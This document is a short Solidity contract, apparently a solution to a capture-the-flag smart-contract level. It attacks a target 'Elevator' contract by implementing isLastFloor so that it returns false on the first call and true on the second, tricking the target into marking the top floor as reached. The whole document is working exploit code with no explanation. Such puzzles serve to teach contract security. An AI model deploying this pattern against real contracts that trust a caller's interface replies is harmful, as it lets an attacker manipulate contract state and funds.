contract callElevator {

    Elevator elevator;
    bool calledYet = false;

    constructor(address target) public {
        elevator = Elevator(target);
    }

    function reachLastFloor(uint floor) public {
        elevator.goTo(floor);
    }

    function isLastFloor(uint floor) public returns(bool){
        if (!calledYet) {
            calledYet = true;
            return(false);
        }
        else {
            return(true);
        }
    }
}